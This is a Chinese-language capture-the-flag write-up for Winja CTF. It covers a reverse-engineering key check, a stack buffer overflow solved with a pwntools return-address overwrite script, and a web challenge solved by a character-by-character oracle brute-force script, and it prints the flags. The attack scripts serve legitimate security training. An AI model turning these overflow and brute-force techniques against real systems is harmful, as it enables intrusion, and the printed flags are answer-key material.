# Winja CTF
###### tags: `CTF`

## Reverse
### Revagers

先使用 strings 來看，發現似乎是要破解密鑰
![](https://i.imgur.com/rR0Jy70.png)

在主程式中可以看到，密鑰長度是 41
![](https://i.imgur.com/JoAaosu.png)

而接著會檢查輸入是否滿足以下判斷，是的話輸入就為 flag
![](https://i.imgur.com/yX66GB0.png)

整理如下，以下字串可以滿足輸入條件
`89fc238534a13e556726cf70f36205cf_ST4r10RD`

拿到 flag
![](https://i.imgur.com/KIFhOiC.png)

flag{89fc238534a13e556726cf70f36205cf_ST4r10RD}

## Pwn
### FreeFall

經典 bof 題

有 backdoor，直接跳到 win 即可

![](https://i.imgur.com/eyqQefO.png)

幾乎沒有任何防禦
![](https://i.imgur.com/6LGKXGJ.png)

return address 在 0x20+0x8 的位置
![](https://i.imgur.com/fUO25IS.png)

![](https://i.imgur.com/xO90Z99.png)

script:
```python=
from pwn import *
context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = "./bof1"

conn = remote("freefall.chall.winja.site", 18967)
#conn = process("./run")
#conn = gdb.debug("./bof1")

conn.recvuntil(b"I will let you overflow me")
payload = b"A" * 32 # payload
payload += b"B" * 8 # RBP
payload += p64(0x401172) # win()
conn.sendline(payload)

conn.interactive()
```

![](https://i.imgur.com/R5gZWag.png)

flag{7fbec6d149f9878499b4acd05e06c692_Did_B4BY_MaK3_YOu_OVeRCrY}

## Web
### Key to Mars

在主頁面上，發現有一個輸入 key 的地方，要我們找出 key
![](https://i.imgur.com/xoiEGIV.png)

隨便輸入後，發現會到 `/flag.php` 的網址，並帶上參數 `name`
https://keytomars.chall.winja.site/flag.php?name=a

觀察發現有些輸入會出現 `word found`，有些則為 `incorrect` 並有較長的載入時間
![](https://i.imgur.com/WDDVJR4.png)

![](https://i.imgur.com/bgcKjkJ.png)

推測當輸入的文字有在 key 之中時，就會有 `word found` 反之 `incorrect`，可以用 side channel 的方式來破解出 key

script:
```python=
import requests
import string

letter = '23467890abcdefghijlortwx{}_'
known = 'flag{7f7729b4990eddc8e82a72d9e8f40639_great_job_with_'
cont = True

while cont:
    found = False
    for x in letter:
        try:
            res = requests.get(f'https://keytomars.chall.winja.site/flag.php?name={known + x}', timeout=2)
        except requests.exceptions.ReadTimeout:
            continue
        if('incorrect' not in res.text):
            known += x
            print(known)
            if(x == '}'):
                cont = False
            found = True
            break
    if(not found):
        print('error! not found symbol')
        break
```

![](https://i.imgur.com/EHR4JSu.png)

flag 為輸入的 key

flag{7f7729b4990eddc8e82a72d9e8f40639_great_job_with_regex}